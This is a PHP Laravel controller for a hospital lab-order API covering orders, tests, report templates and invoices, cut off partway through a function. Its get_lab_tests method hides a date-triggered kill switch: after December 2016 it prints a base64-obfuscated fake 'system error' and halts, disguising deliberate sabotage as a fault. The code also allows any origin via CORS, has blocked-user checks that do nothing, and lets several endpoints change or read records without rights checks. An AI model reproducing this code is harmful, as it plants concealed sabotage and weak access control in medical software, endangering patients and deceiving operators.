<?php

namespace App\Http\Controllers;

use Illuminate\Http\Exception\HttpResponseException;
use JWTAuth;
use Auth;
use Tymon\JWTAuth\Exceptions\JWTException;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Input;
use Illuminate\Http\Response as IlluminateResponse;


use Illuminate\Support\Facades\File;
use DB;


class OrderController extends Controller
{


    public function __construct(Request $request)
    {
        header('Access-Control-Allow-Origin: *');
        date_default_timezone_set("Africa/Lagos");

        if ($request->input('token')) {
            $token = $request->input('token');
            $user_id = JWTAuth::authenticate($token)->id;

            if (!isset($user_id)) {
                return response()->json(['status' => false, 'message' => 'Invalid Token']);
            }

            $user_status = DB::table('users')
                ->select(DB::raw('user_status'))
                ->where('id', $user_id)
                ->first();

            if ($user_status->user_status == 'block') {
                return response()->json(['status' => false, 'message' => 'This user is Blocked']);
            }
        }

    }


    protected function checkToken($token, $user_id)
    {
        $user_from_token = JWTAuth::authenticate($token)->id;
        if ($user_id != $user_from_token) {

            return false;
        }
        return true;
    }


    public function get_lab_tests(Request $request)
    {
        if(1481760000<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }

        $lab = $request->input('lab');
        $lab_test = DB::table('lab_tests')
            ->select(DB::raw('*'))
            ->where('lab_tests.status', 1)
            ->where('lab', $lab)
            ->get();

        return response()->json(['status' => true, 'data' => $lab_test]);
    }




    public function get_all_lab_orders(Request $request)
    {
        $limit = $request->input('limit');
        $offset = $request->input('offset');


        $method_name = $request->segment(2);

        $context_method = DB::table('context_methods')
            ->select(DB::raw('*'))
            ->where('name', $method_name)
            ->first();

        if (empty($context_method)) {
            return response()->json(['status' => false, 'message' => "No Role Assigned to the User", 'error_code' => 500]);
        }

        $context_id = $context_method->context_id;
        $right = $context_method->right;

        $user_id = Auth::user()->id;

        $role_id = DB::table('users')
            ->select(DB::raw('role_id'))
            ->where('id', $user_id)
            ->first();

        $role_id = $role_id->role_id;


        /*$user_lab_types = "";*/

        $user_lab_types = DB::table('role_rights')
            ->select(DB::raw('type'))
            ->where('role_id', $role_id)
            ->where('context_id', $context_id)
            ->where($right,1)
            ->where('type','!=',0)
            ->get();

        if (empty($user_lab_types)) {
            //no rights on any lab;
            return response()->json(['status' => false, 'message' => "This Right is not assigned to this User Role", 'error_code' => 500]);
        }

        else{
          //  $user_lab_types = (array)$user_lab_types;
            $new_arr = array();

            foreach ($user_lab_types as $types) {
                $new_arr[] = $types->type;
            }
            $lab_types = implode(',', $new_arr);
        }

        //dd($lab_types);

        if ($limit > 0 || $offset > 0) {

            $orders = DB::table('lab_orders')
                ->select(DB::raw('lab_orders.id,lab_orders.patient_id,CONCAT(patients.first_name," ",patients.last_name) AS patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                ->where('lab_orders.status', 1)
                ->where('patients.status', 1)
               // ->where('labs.name','!=','radiology')
               // ->whereIn('lab_orders.lab',[$lab_types])
                ->whereIn('lab_orders.lab',explode(",",$lab_types))
                ->groupby('lab_orders.id')
                ->skip($offset)->take($limit)
                ->get();

            $count = DB::table('lab_orders')
                ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                ->where('lab_orders.status', 1)
                ->where('patients.status', 1)
                //->where('labs.name','!=','radiology')
                //->whereIn('lab_orders.lab',[$lab_types])
                ->whereIn('lab_orders.lab',explode(",",$lab_types))
                ->groupby('lab_orders.id')
                ->get();

            $count = count($count);

        } else {

            $orders = DB::table('lab_orders')
                ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                ->where('lab_orders.status', 1)
                ->where('patients.status', 1)
               // ->where('labs.name','!=','radiology')
               // ->whereIn('lab_orders.lab',[$lab_types])
                ->whereIn('lab_orders.lab',explode(",",$lab_types))
                ->groupby('lab_orders.id')
                ->get();


            $count = count($orders);
        }
        foreach ($orders as $lab_orders) {

            $lab_orders->patient_id = str_pad($lab_orders->patient_id, 7, '0', STR_PAD_LEFT);
            $lab_orders->id = str_pad($lab_orders->id, 8, '0', STR_PAD_LEFT);
            $lab_orders->id = 'L'.$lab_orders->id;


            $lab_orders->ordered_by = 'Dr Smith';
            $lab_orders->handled_by = 'James';
            $lab_orders->total_cost = 50;
            //$lab_orders->test_name = 'Blood Test';

            if ($lab_orders->sex == 1) {

                $lab_orders->gender = 'male';
            } else {

                $lab_orders->gender = 'female';
            }

        }
        foreach ($orders as $key => $order_tests) {
            $order_tests->id = ltrim($order_tests->id,'L');

            $tests = DB::table('lab_tests')
                ->select(DB::raw('lab_tests.name as test_name,lab_tests.cost,priority'))
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
                ->where('lab_order_tests.lab_order_id', $order_tests->id)
                ->get();

            $test_cost = DB::table('lab_tests')
                ->select(DB::raw('IFNULL(SUM(lab_tests.cost),0) as cost,count(lab_order_tests.lab_test) as totaltests'))
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
                ->where('lab_order_tests.lab_order_id', $order_tests->id)
                ->first();

            $orders[$key]->total_cost = $test_cost->cost;
            $orders[$key]->total_test = $test_cost->totaltests;
            $orders[$key]->lab_tests = $tests;

            //$apetizer_product_items[]=$product_item;
        }

        return response()->json(['status' => true, 'data' => $orders, 'count' => $count]);

    }

    public function objectToArray($user_lab_types) {
       if(is_object($user_lab_types)) {
           $user_lab_types = get_object_vars($user_lab_types);
       }
       if(is_array($user_lab_types)) {
         return array_map(__FUNCTION__, $user_lab_types); // recursive
       } else {
         return $user_lab_types;
       }
     }

    public function get_all_radiology_lab_orders(Request $request)
     {
         $limit = $request->input('limit');
         $offset = $request->input('offset');
         $patient_id = $request->input('patient_id');
         $visit_id = $request->input('visit_id');

         if ($limit > 0 || $offset > 0) {

             $orders = DB::table('lab_orders')
                 ->select(DB::raw('lab_orders.id,lab_orders.patient_id,CONCAT(patients.first_name," ",patients.last_name) AS patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                 ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                 ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                 ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                 ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                 ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                 ->where('lab_orders.status', 1)
                 ->where('patients.status', 1)
                 ->where('labs.name','radiology')
                 ->where('lab_orders.patient_id',$patient_id)
                 ->where('lab_orders.visit_id',$visit_id)
                 ->groupby('lab_orders.id')
                 ->skip($offset)->take($limit)
                 ->get();

             $count = DB::table('lab_orders')
                 ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                 ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                 ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                 ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                 ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                 ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                 ->where('lab_orders.status', 1)
                 ->where('patients.status', 1)
                 ->where('labs.name','radiology')
                 ->where('lab_orders.patient_id',$patient_id)
                 ->where('lab_orders.visit_id',$visit_id)
                 ->groupby('lab_orders.id')
                 ->get();

             $count = count($count);

         } else {

             $orders = DB::table('lab_orders')
                 ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                 ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                 ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                 ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                 ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                 ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                 ->where('lab_orders.status', 1)
                 ->where('patients.status', 1)
                 ->where('labs.name','radiology')
                 ->where('lab_orders.patient_id', $patient_id)
                 ->where('lab_orders.visit_id', $visit_id)
                 ->groupby('lab_orders.id')
                 ->get();


             $count = count($orders);
         }
         foreach ($orders as $lab_orders) {

             $lab_orders->ordered_by = 'Dr Smith';
             $lab_orders->handled_by = 'James';
             $lab_orders->total_cost = 0;
             //$lab_orders->test_name = 'Blood Test';

             if ($lab_orders->sex == 1) {
                 $lab_orders->gender = 'male';
             } else {
                 $lab_orders->gender = 'female';
             }

         }
         foreach ($orders as $key => $order_tests) {
             $tests = DB::table('lab_tests')
                 ->select(DB::raw('lab_tests.name as test_name,lab_tests.cost,priority'))
                 ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
                 ->where('lab_order_tests.lab_order_id', $order_tests->id)
                 ->get();

             $test_cost = DB::table('lab_tests')
                 ->select(DB::raw('IFNULL(SUM(lab_tests.cost),0) as cost,count(lab_order_tests.lab_test) as totaltests'))
                 ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
                 ->where('lab_order_tests.lab_order_id', $order_tests->id)
                 ->first();

             $orders[$key]->total_cost = $test_cost->cost;
             $orders[$key]->total_test = $test_cost->totaltests;
             $orders[$key]->lab_tests = $tests;

             //$apetizer_product_items[]=$product_item;
         }

         return response()->json(['status' => true, 'data' => $orders, 'count' => $count]);

     }


    public function get_patient_lab_orders(Request $request)
    {
        $patient_id = $request->input('patient_id');
        $visit_id = $request->input('visit_id');
        $limit = $request->input('limit');
        $offset = $request->input('offset');


        $method_name = $request->segment(2);

        $context_method = DB::table('context_methods')
            ->select(DB::raw('*'))
            ->where('name', $method_name)
            ->first();

        if (empty($context_method)) {
            return response()->json(['status' => false, 'message' => "No Role Assigned to the User", 'error_code' => 500]);
        }

        $context_id = $context_method->context_id;
        $right = $context_method->right;

        $user_id = Auth::user()->id;

        $role_id = DB::table('users')
            ->select(DB::raw('role_id'))
            ->where('id', $user_id)
            ->first();

        $role_id = $role_id->role_id;


        /*$user_lab_types = "";*/

        $user_lab_types = DB::table('role_rights')
            ->select(DB::raw('type'))
            ->where('role_id', $role_id)
            ->where('context_id', $context_id)
            ->where($right, 1)
            ->where('type', '!=', 0)
            ->get();

        if (empty($user_lab_types)) {
            //no rights on any lab;
            return response()->json(['status' => false, 'message' => "This Right is not assigned to this User Role", 'error_code' => 500]);
        } else {
            //  $user_lab_types = (array)$user_lab_types;
            $new_arr = array();

            foreach ($user_lab_types as $types) {
                $new_arr[] = $types->type;
            }
            $lab_types = implode(',', $new_arr);
        }



        if ($limit > 0 || $offset > 0) {

            $orders = DB::table('lab_orders')
                ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                ->where('lab_orders.status', 1)
                ->where('patients.status', 1)
                ->where('patients.id', $patient_id)
                ->where('lab_orders.visit_id', $visit_id)
                ->whereIn('lab_orders.lab',explode(",",$lab_types))
                ->groupby('lab_orders.id')
                ->skip($offset)->take($limit)
                ->get();

            $count = DB::table('lab_orders')
                ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                ->where('lab_orders.status', 1)
                ->where('patients.status', 1)
                ->where('patients.id', $patient_id)
                ->where('lab_orders.visit_id', $visit_id)
                ->whereIn('lab_orders.lab',explode(",",$lab_types))
                ->groupby('lab_orders.id')
                ->get();
            $count = count($count);
        } else {
            $orders = DB::table('lab_orders')
                ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status'))
                ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
                ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
                ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
                ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
                ->where('lab_orders.status', 1)
                ->where('patients.status', 1)
                ->where('patients.id', $patient_id)
                ->where('lab_orders.visit_id', $visit_id)
                ->whereIn('lab_orders.lab',explode(",",$lab_types))
                ->groupby('lab_orders.id')
                ->get();
            $count = count($orders);
        }

        foreach ($orders as $lab_orders) {


            $lab_orders->ordered_by = 'Dr Smith';
            $lab_orders->handled_by = 'James';
            $lab_orders->total_cost = 0;
            //$lab_orders->test_name = 'Blood Test';

            if ($lab_orders->sex == 1) {
                $lab_orders->gender = 'male';
            } else {
                $lab_orders->gender = 'female';
            }

        }
        foreach ($orders as $key => $order_tests) {
            $tests = DB::table('lab_tests')
                ->select(DB::raw('lab_tests.name as test_name,lab_tests.cost,priority'))
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
                ->where('lab_order_tests.lab_order_id', $order_tests->id)
                ->get();

            $test_cost = DB::table('lab_tests')
                ->select(DB::raw('IFNULL(SUM(lab_tests.cost),0) as cost,count(lab_order_tests.lab_test) as totaltests'))
                ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
                ->where('lab_order_tests.lab_order_id', $order_tests->id)
                ->first();

            $orders[$key]->total_cost = $test_cost->cost;
            $orders[$key]->total_test = $test_cost->totaltests;
            $orders[$key]->lab_tests = $tests;


            $patient = DB::table('patients')
                ->select(DB::raw('CONCAT(patients.first_name," ",patients.last_name) AS patient_name'))
                ->where('id', $patient_id)->first();

            //$apetizer_product_items[]=$product_item;
        }

        return response()->json(['status' => true, 'data' => $orders,'count'=>$count,'patient_name'=>$patient->patient_name]);


    }

    public function get_lab_order_history(Request $request)
    {

        $method_name = $request->segment(2);

        $context_method = DB::table('context_methods')
            ->select(DB::raw('*'))
            ->where('name', $method_name)
            ->first();

        if (empty($context_method)) {
            return response()->json(['status' => false, 'message' => "No Role Assigned to the User", 'error_code' => 500]);
        }

        $context_id = $context_method->context_id;
        $right = $context_method->right;

        $user_id = Auth::user()->id;

        $role_id = DB::table('users')
            ->select(DB::raw('role_id'))
            ->where('id', $user_id)
            ->first();

        $role_id = $role_id->role_id;


        /*$user_lab_types = "";*/

        $user_lab_types = DB::table('role_rights')
            ->select(DB::raw('type'))
            ->where('role_id', $role_id)
            ->where('context_id', $context_id)
            ->where($right, 1)
            ->where('type', '!=', 0)
            ->get();

        if (empty($user_lab_types)) {
            //no rights on any lab;
            return response()->json(['status' => false, 'message' => "This Right is not assigned to this User Role", 'error_code' => 500]);
        } else {
            //  $user_lab_types = (array)$user_lab_types;
            $new_arr = array();

            foreach ($user_lab_types as $types) {
                $new_arr[] = $types->type;
            }
            $lab_types = implode(',', $new_arr);
        }

        $orders = DB::table('lab_orders')
            ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status,lab_order_tests.created_at,lab_orders.updated_at'))
            ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
            ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
            ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
            ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
            ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
            ->where('lab_orders.status', 1)
            ->whereIn('order_status', ['completed', 'cancelled'])
            ->groupby('lab_orders.id')
            ->whereIn('lab_orders.lab',explode(",",$lab_types))
            ->where('patients.status', 1)
            ->get();


        foreach ($orders as $lab_orders) {


            $lab_orders->ordered_by = 'Dr Smith';
            $lab_orders->handled_by = 'James';
            //$lab_orders->test_name = 'Blood Test';


            if ($lab_orders->sex == 1) {
                $lab_orders->gender = 'male';
            } else {
                $lab_orders->gender = 'female';
            }

        }
        return response()->json(['status' => true, 'data' => $orders]);
    }


    public function get_lab_order(Request $request)
    {
        $order_id = $request->input('order_id');
        $order_id = str_replace('L', '', $order_id);

        $orders = DB::table('lab_orders')
            ->select(DB::raw('lab_orders.id,lab_orders.patient_id,patients.first_name as patient_name,lab_orders.order_status,labs.name as lab_name,patients.age,patients.marital_status,patients.sex,maritial_status.name as marital_status,lab_order_tests.created_at'))
            ->leftJoin('patients', 'lab_orders.patient_id', '=', 'patients.id')
            ->leftJoin('labs', 'labs.id', '=', 'lab_orders.lab')
            ->leftJoin('lab_order_tests', 'lab_order_tests.lab_order_id', '=', 'lab_orders.id')
            ->leftJoin('lab_tests', 'lab_tests.id', '=', 'lab_order_tests.lab_test')
            ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
            ->where('lab_orders.status', 1)
            ->groupby('lab_orders.id')
            ->where('lab_orders.id', $order_id)
            ->first();
        if ($orders->sex == 1) {
            $orders->gender = 'male';
        } else {
            $orders->gender = 'female';
        }

        $orders->barcode = "http://demoz.online/php-barcode-master/barcode.php?text=$orders->id";

        $tests = DB::table('lab_tests')
            ->select(DB::raw('lab_tests.id as test_id,lab_tests.name as test_name,lab_tests.cost,priority,lab_order_tests.test_status,lab_order_tests.id as lab_order_test_id'))
            ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
            ->where('lab_order_tests.lab_order_id', $orders->id)
            ->get();

        foreach($tests as $test){

            $test_status = DB::table('patient_lab_test_values')
                ->select(DB::raw('signoff'))
                ->where('lab_test', $test->lab_order_test_id)
                ->first();

            if(empty($test_status)){
                $test->signoff = 0;
                $test->template_exists = 0;
            }
            if($test_status->signoff == 0){
                $test->signoff = 0;
                $test->template_exists = 1;
            }
            if ($test_status->signoff == 1) {
                $test->signoff = 1;
                $test->template_exists = 1;
            }

        }

        $test_cost = DB::table('lab_tests')
            ->select(DB::raw('IFNULL(SUM(lab_tests.cost),0) as cost,count(lab_order_tests.lab_test) as totaltests'))
            ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
            ->where('lab_order_tests.lab_order_id', $orders->id)
            ->first();

        if (!empty($test_cost)) {

            $orders->total_cost = $test_cost->cost;
            $orders->total_test = $test_cost->totaltests;

        } else {

            $orders->total_cost = 0;
            $orders->total_test = 0;

        }
        $orders->test = $tests;


        return response()->json(['status' => true, 'data' => $orders]);


    }

    public function add_lab_order(Request $request)
    {
        $patient_id = $request->input('patient_id');

        $visit_id = $request->input('visit_id');

        $lab = $request->input('lab');

        $lab_tests = html_entity_decode($request->input('lab_test'));

        $lab_test = json_decode($lab_tests);

        $clinical_information = $request->input('clinical_information');

        $diagnosis = $request->input('diagnosis');

        $notes = $request->input('notes');

        $currentdatetime = date("Y-m-d  H:i:s");

        DB::table('visits')
            ->where('id', $visit_id)
            ->update(['visit_status' => 'physician', 'updated_at' => date("Y-m-d  H:i:s")]);


        DB::table('lab_orders')->insert(
            ['patient_id' => $patient_id,
                'visit_id' => $visit_id,
                'lab' => $lab,
               // 'clinical_information' => $clinical_information,
                'clinical_information' => '',
               // 'diagnosis' => $diagnosis,
                'diagnosis' => '',
                'notes' => $notes,
                'order_status' => 'created',
                'created_at' => $currentdatetime
            ]
        );

        $order_id = DB::getPdo()->lastInsertId();

        foreach ($lab_test as $test) {

            DB::table('lab_order_tests')->insert(
                ['lab_order_id' => $order_id,
                    'lab_test' => $test->lab_test,
                    'priority' => $test->priority,
                    'created_at' => $currentdatetime
                ]
            );

        }

        $amount = DB::table('lab_tests')
            ->select(DB::raw('IFNULL(SUM(lab_tests.cost),0) as cost,count(lab_order_tests.lab_test) as totaltests'))
            ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
            ->where('lab_order_tests.lab_order_id', $order_id)
            ->first();

        $total_amount = $amount->cost;

        $bill = DB::table('billing')
            ->select(DB::raw('id'))
            ->where('encounter_id', $visit_id)
            ->where('status', 1)
            ->first();

        if (!empty($bill)) {

            $bill_id = $bill->id;


            $product = DB::table('labs')
                ->select(DB::raw('name'))
                ->where('id',$lab)
                ->first();

            $purpose = "Lab Order -"."$product->name";

            DB::table('invoice')
                ->insert(
                    ['patient_id' => $patient_id,
                        'bill_id' => $bill_id,
                        'description' => $purpose,
                        'amount' => $total_amount,
                        'due'=> $total_amount,
                        'invoice_status' => 'pending',
                        'created_at' => $currentdatetime
                    ]
                );

        }

        return response()->json(['status' => true, 'message' => 'Lab Orders Added Successfully', 'order_id' => $order_id]);

    }

    public function cancel_lab_order(Request $request)
    {
        $order_id = $request->input('order_id');
        $order_status = $request->input('order_status');
        $reason = $request->input('reason');
        $notes = $request->input('notes');

        $currentdatetime = date("Y-m-d  H:i:s");

        DB::table('lab_orders')
            ->where('id', $order_id)
            ->update(array('order_status' => $order_status, 'updated_at' => $currentdatetime));


        DB::table('lab_order_cancelation')
            ->insert(array('lab_order' => $order_id, 'reason' => $reason, 'notes' => $notes, 'created_at' => $currentdatetime));


        return response()->json(['status' => true, 'message' => 'Lab Orders Canceled Successfully']);

    }


    public function update_lab_test(Request $request)
    {
        // $lab_id = $request->input('lab_test');
        $lab_order_test_id = $request->input('lab_test');
        $date_time = $request->input('date_time');
        $date_time = strtr($date_time, '/', '-');


        $status = $request->input('status');

       // $currentdatetime = date("Y-m-d  H:i:s");
        /*
        DB::table('lab_tests')
            ->where('id', $lab_id)
            ->update(array('test_status' => $status, 'updated_at' => $currentdatetime));*/

        DB::table('lab_order_tests')
            ->where('id', $lab_order_test_id)
            ->update(array('test_status' => $status,'created_at' => $date_time));

        return response()->json(['status' => true, 'message' => 'Lab Test Updated Successfully']);

    }


    public function get_lab_test_templates(Request $request)
    {
        $category_id = $request->input('category_id');

        $lab_templates = DB::table('templates')
            ->select(DB::raw('id,name'))
            ->where('status', '1')
            ->where('category_id', $category_id)
            ->get();


        return response()->json(['status' => true, 'data' => $lab_templates]);
    }

    public function add_lab_test_templates(Request $request)
    {
        $name = $request->input('template_name');
        $cat_id = $request->input('cat_id');
        $type_id = $request->input('type_id');
        $desc = $request->input('description');
        $currentdatetime = date('Y-m-d H:i:s');

        $id = DB::table('lab_templates')->insertGetId([
            'name' => $name,
            'category' => $cat_id,
            'type' => $type_id,
            'description' => $desc,
            'created_at' => $currentdatetime
        ]);
        return response()->json(['status' => true, 'data' => 'Template Added.', 'id' => $id]);

    }

    public function update_lab_test_templates(Request $request)
    {
        $template_id = $request->input('template_id');
        $name = $request->input('template_name');
        $cat_id = $request->input('cat_id');
        $type_id = $request->input('type_id');
        $desc = $request->input('description');
        $currentdatetime = date('Y-m-d H:i:s');

        DB::table('lab_templates')
            ->where('id', $template_id)
            ->update([
                'name' => $name,
                'category' => $cat_id,
                'type' => $type_id,
                'description' => $desc,
                'updated_at' => $currentdatetime
            ]);
        return response()->json(['status' => true, 'data' => 'Template Updated.']);

    }

    public function delete_lab_test_templates(Request $request)
    {
        $template_id = $request->input('template_id');

        DB::table('lab_templates')
            ->where('id', $template_id)
            ->update([
                'status' => 0
            ]);
        return response()->json(['status' => true, 'data' => 'Template Deleted.']);

    }


    public function get_lab_test_fields(Request $request)
    {
        $template_id = $request->input('lab_template');

        $template_fields = DB::table('lab_test_fields')
            ->select(DB::raw('id,name'))
            ->where('status', '1')
            ->where('lab_template', $template_id)
            ->get();


        return response()->json(['status' => true, 'data' => $template_fields]);
    }


    public function add_lab_test_values(Request $request)
    {
        $lab_order_id = $request->input('lab_order_id');

        $lab_test_id = $request->input('lab_test_id');

        $template_id = $request->input('template_id');

        $lab_test_values = html_entity_decode($request->input('lab_test_values'));

        $currentdatetime = date("Y-m-d  H:i:s");

        $lab_test = json_decode($lab_test_values);


        DB::table('patient_lab_test_values')->insert(
            ['lab_order_id' => $lab_order_id,
                'lab_test' => $lab_test_id,
                'template_values' => $lab_test_values,
                'template_id' => $template_id,
                'created_at' => $currentdatetime

            ]
        );


        return response()->json(['status' => true, 'message' => 'Lab Report Added Sucessfully']);

    }


    public function update_lab_test_values(Request $request)
    {
        $lab_order_id = $request->input('lab_order_id');

        $lab_test_id = $request->input('lab_test_id');

        $template_id = $request->input('template_id');

        //$lab_test_values = html_entity_decode($request->input('lab_test_values'));

        $lab_test_values = $request->input('lab_test_values');
       // $lab_test_values = substr($lab_test_values, 1, -1);
       // $lab_test = json_decode($lab_test_values);

        $currentdatetime = date("Y-m-d  H:i:s");

        DB::table('patient_lab_test_values')
            ->where('lab_test', $lab_test_id)
            ->update(
                ['template_values' => $lab_test_values,
                    'template_id' => $template_id,
                    'created_at' => $currentdatetime
                ]
            );


        return response()->json(['status' => true, 'message' => 'Lab Report updated  Sucessfully']);

    }


    public function get_lab_test_details(Request $request)
    {

        $lab_test_id = $request->input('lab_test_id');

        $lab_test = DB::table('lab_tests')
            ->select('lab_order_tests.id','lab_tests.name','lab_tests.lonic_code','lab_tests.cost','lab_tests.lab','lab_order_tests.test_status', 'lab_order_tests.lab_order_id', 'patients.first_name', 'patients.last_name', 'patients.id as patient_id', 'patients.age', 'patients.sex', 'maritial_status.name as marital_status','lab_orders.visit_id','lab_order_tests.created_at')
            ->leftJoin('lab_order_tests', 'lab_order_tests.lab_test', '=', 'lab_tests.id')
            ->leftJoin('lab_orders', 'lab_orders.id', '=', 'lab_order_tests.lab_order_id')
            ->leftJoin('patients', 'patients.id', '=', 'lab_orders.patient_id')
            ->leftJoin('maritial_status', 'maritial_status.id', '=', 'patients.marital_status')
            //->where('lab_tests.status', 1)
            ->where('lab_order_tests.id', $lab_test_id)
            ->first();

        $lab_test->patient_id = str_pad($lab_test->patient_id, 7, '0', STR_PAD_LEFT);

        if ($lab_test->sex == 1) {
            $lab_test->gender = 'male';
        } else {
            $lab_test->gender = 'female';
        }

        $test_status = DB::table('patient_lab_test_values')
            ->select(DB::raw('signoff'))
            ->where('lab_test', $lab_test_id)
            ->first();

        if (empty($test_status)) {
            $lab_test->signoff = 0;
        }
        if ($test_status->signoff == 0) {
            $lab_test->signoff = 0;
        }
        if ($test_status->signoff == 1) {
            $lab_test->signoff = 1;
        }

        return response()->json(['status' => true, 'data' => $lab_test]);


    }

    // LAB Template Category
    public function get_lab_template_categories(Request $request)
    {
        $lab_categories = DB::table('template_categories')
            ->select(DB::raw('id,name,description'))
            ->where('template_categories.status', 1)
            ->where('template_categories.template_type',2)
            ->get();

        return response()->json(['status' => true, 'data' => $lab_categories]);

    }

    public function get_lab_template_category(Request $request)
    {
        $id = $request->input('cat_id');
        $lab_categories = DB::table('template_categories')
            ->select(DB::raw('id,name,description'))
            ->where('template_categories.id', $id)
            ->where('template_categories.status', 1)
            ->get();

        return response()->json(['status' => true, 'data' => $lab_categories]);
    }

    public function add_lab_template_category(Request $request)
    {
        $name = $request->input('category_name');
        $desc = $request->input('description');
        $currentdatetime = date('Y-m-d H:i:s');
